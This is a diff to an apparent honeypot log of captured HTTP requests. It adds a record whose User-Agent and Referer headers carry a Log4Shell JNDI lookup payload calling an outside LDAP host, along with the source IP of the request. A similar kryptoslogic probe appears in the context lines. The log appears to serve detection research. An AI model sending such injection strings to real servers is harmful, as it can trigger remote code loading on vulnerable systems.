@@ -1,6 +1,20 @@
 ```
 GET / HTTP/1.1
 Host: !!IP_ADDRESS!!
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: ${jndi:ldap://log4shell.huntress.com:1389/4ac61c12-0c8c-4552-95f0-dfa4053b4577}
+Referer: ${jndi:ldap://log4shell.huntress.com:1389/4ac61c12-0c8c-4552-95f0-dfa4053b4577}
+```
+
+Source IPs:
+- 36.72.216.81
+
+-------------------------------------------------------------------------------------------
+```
+GET / HTTP/1.1
+Host: !!IP_ADDRESS!!
 User-Agent: ${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}
 Accept: */*
 Accept-Encoding: gzip
